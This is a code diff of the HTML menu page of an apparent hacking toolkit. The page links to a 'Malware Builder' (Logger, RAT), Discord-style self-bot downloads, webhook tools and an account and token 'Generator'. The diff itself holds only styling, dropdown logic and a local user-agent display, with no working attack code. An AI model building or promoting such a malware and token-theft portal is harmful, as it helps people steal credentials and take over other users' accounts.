@@ -15,117 +15,130 @@
     <link rel="stylesheet" href="http://sinfulzen.github.io/Elixir-Toolbox/assets/css/layout.css">
 
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #1c1c1c;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            position: relative;
-            width: 80%;
-            max-width: 600px;
-            background: rgba(51, 51, 51, 0.9);
-            border: 2px solid #b19cd9;
-            border-radius: 20px;
-            padding: 30px;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-        }
-        .blob {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: rgba(128, 0, 128, 0.5);
-            border-radius: 50%;
-            filter: blur(50px);
-            animation: float 10s infinite;
-            z-index: 0;
-        }
-        @keyframes float {
-            0% { transform: translate(0, 0); }
-            50% { transform: translate(100px, 100px); }
-            100% { transform: translate(0, 0); }
-        }
-        .hyperlink {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #b19cd9;
-            text-decoration: none;
-            transition: color 0.3s ease;
-            position: relative;
-            padding: 8px 20px;
-            cursor: pointer;
-            border: none;
-            background: none;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .hyperlink:hover {
-            color: #986fbb;
-        }
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(51, 51, 51, 0.9);
-            border: 2px solid #b19cd9;
-            border-radius: 20px;
-            min-width: 200px;
-            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
-            z-index: 1;
-            margin-top: 10px;
-            flex-direction: column;
-        }
-        .hyperlink:hover .dropdown-content {
-            display: flex;
-        }
-        .dropdown-content a {
-            color: #b19cd9;
-            padding: 12px 16px;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            border-radius: 20px;
-            transition: background-color 0.3s ease;
-        }
-        .dropdown-content a:hover {
-            background-color: #575757;
-        }
-        .dropdown-content a img {
-            margin-right: 10px;
-            width: 24px;
-            height: 24px;
-        }
-        .counter-bar {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: rgba(51, 51, 51, 0.9);
-            border-top: 2px solid #b19cd9;
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 20px;
-            box-sizing: border-box;
-            z-index: 1;
-        }
-        .counter-bar p {
-            color: #fff;
-            font-size: 12px;
-            margin: 0;
-        }
+body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #1c1c1c;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+}
+.container {
+    position: relative;
+    width: 80%;
+    max-width: 600px;
+    background: rgba(51, 51, 51, 0.9);
+    border: 2px solid #b19cd9;
+    border-radius: 20px;
+    padding: 30px;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 1;
+}
+.blob {
+    position: absolute;
+    width: 300px;
+    height: 300px;
+    background: rgba(128, 0, 128, 0.5);
+    border-radius: 50%;
+    filter: blur(50px);
+    animation: float 10s infinite;
+    z-index: 0;
+}
+@keyframes float {
+    0% { transform: translate(0, 0); }
+    50% { transform: translate(100px, 100px); }
+    100% { transform: translate(0, 0); }
+}
+.hyperlink {
+    margin-top: 20px;
+    font-size: 18px;
+    color: #b19cd9;
+    text-decoration: none;
+    transition: color 0.3s ease;
+    position: relative;
+    padding: 8px 20px;
+    cursor: pointer;
+    border: none;
+    background: none;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+.hyperlink:hover {
+    color: #986fbb;
+}
+.dropdown-content {
+    display: none;
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: rgba(51, 51, 51, 0.9);
+    border: 2px solid #b19cd9;
+    border-radius: 20px;
+    min-width: 200px;
+    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+    z-index: 1;
+    margin-top: 10px;
+    flex-direction: column;
+}
+.hyperlink.show .dropdown-content {
+    display: flex;
+}
+.dropdown-content a {
+    color: #b19cd9;
+    padding: 12px 16px;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    border-radius: 20px;
+    transition: background-color 0.3s ease;
+}
+.dropdown-content a:hover {
+    background-color: #575757;
+}
+.dropdown-content a img {
+    margin-right: 10px;
+    width: 24px;
+    height: 24px;
+}
+.counter-bar {
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    background: rgba(51, 51, 51, 0.9);
+    border-top: 2px solid #b19cd9;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 20px;
+    box-sizing: border-box;
+    z-index: 1;
+}
+.counter-bar p {
+    color: #fff;
+    font-size: 12px;
+    margin: 0;
+}
+.device-info {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    text-align: center;
+}
+.description {
+    font-size: 12px;
+    color: #b19cd9;
+    margin: 5px 0 0 0;
+}
+
     </style>
 </head>
 <body>
@@ -134,55 +147,61 @@
         <div class="blob" style="animation-delay: 2s; left: 50%;"></div>
         <div class="blob" style="animation-delay: 4s; top: 50%;"></div>
 
-        <div class="hyperlink">
+        <div class="hyperlink" onclick="toggleDropdown(this)">
             Malware Builder
             <div class="dropdown-content">
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/builder/logger/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/logger.png" alt="Tool 1 Icon">Logger
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/logger.png" alt="Icon">Logger
                 </a>
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/builder/rat/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/rat.png" alt="Tool 2 Icon">RAT
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/rat.png" alt="Icon">RAT
                 </a>
             </div>
         </div>
 
-        <div class="hyperlink">
+        <div class="hyperlink" onclick="toggleDropdown(this)">
             Self Bot
             <div class="dropdown-content">
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/selfbot/simple/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/simple.png" alt="Tool 1 Icon">Simple
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/simple.png" alt="Icon">Script
                 </a>
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/selfbot/advanced/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/advanced.png" alt="Tool 2 Icon">Advanced
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/advanced.png" alt="Icon">Executable
                 </a>
             </div>
         </div>
 
-        <div class="hyperlink">
+        <div class="hyperlink" onclick="toggleDropdown(this)">
             Webhook Tools
             <div class="dropdown-content">
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/webhook/checker/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/checker.png" alt="Tool 1 Icon">Checker
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/checker.png" alt="Icon">Checker
                 </a>
                 <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/webhook/messager/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/messager.png" alt="Tool 2 Icon">Message Sender
-                </a>
-                <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/webhook/spammer/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/spammer.png" alt="Tool 3 Icon">Spammer
-                </a>
-                <a href="http://sinfulzen.github.io/Elixir-Toolbox/main/webhook/embed/index.html">
-                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/embed.png" alt="Tool 3 Icon">Embed Builder
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/messager.png" alt="Icon">Messager
                 </a>
             </div>
         </div>
-    </div>
+        
+                <div class="hyperlink" onclick="toggleDropdown(this)">
+            Generator
+            <div class="dropdown-content">
+                <a href="#">
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/account.png" alt="Tool 1 Icon">Accounts
+                </a>
+                <a href="#">
+                    <img src="http://sinfulzen.github.io/Elixir-Toolbox/assets/images/icons/token.png" alt="Tool 2 Icon">Tokens
+                </a>
+            </div>
+        </div>
 
     <div class="counter-bar">
         <p id="datetime"></p>
+        <p class="device-info" id="device-info"></p>
         <p id="counter">0</p>
     </div>
 
-        <script src="http://sinfulzen.github.io/Elixir-Toolbox/assets/js/layout.js"></script>
+    <script src="http://sinfulzen.github.io/Elixir-Toolbox/assets/js/layout.js"></script>
     <script>
         let count = 0;
         setInterval(() => {
@@ -198,6 +217,58 @@
         }
         updateTime();
         setInterval(updateTime, 1000);
+
+        function toggleDropdown(element) {
+            const dropdowns = document.querySelectorAll('.dropdown-content');
+            dropdowns.forEach(dropdown => {
+                if (dropdown !== element.querySelector('.dropdown-content')) {
+                    dropdown.style.display = 'none';
+                }
+            });
+            const dropdownContent = element.querySelector('.dropdown-content');
+            dropdownContent.style.display = dropdownContent.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        document.addEventListener('click', function (event) {
+            const isClickInside = event.target.closest('.hyperlink');
+            if (!isClickInside) {
+                document.querySelectorAll('.dropdown-content').forEach(dropdown => {
+                    dropdown.style.display = 'none';
+                });
+            }
+        });
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let device = "Unknown Device";
+            let os = "Unknown OS";
+
+            if (/windows phone/i.test(userAgent)) {
+                device = "Windows Phone";
+            } else if (/android/i.test(userAgent)) {
+                device = "Android Device";
+                const match = userAgent.match(/android\s([0-9.]*)/i);
+                if (match) os = "Android " + match[1];
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                device = "iOS Device";
+                os = "iOS";
+            } else if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(userAgent)) {
+                device = "Mac";
+                const match = userAgent.match(/Mac OS X ([0-9_]+)/);
+                if (match) os = "Mac OS X " + match[1].replace(/_/g, '.');
+            } else if (/Windows NT/.test(userAgent)) {
+                device = "Windows PC";
+                const match = userAgent.match(/Windows NT ([0-9.]+)/);
+                if (match) os = "Windows " + match[1];
+            } else if (/Linux/.test(userAgent)) {
+                device = "Linux PC";
+                os = "Linux";
+            }
+
+            return `${device} - ${os}`;
+        }
+
+        document.getElementById('device-info').textContent = getDeviceInfo();
     </script>
 </body>
 </html>
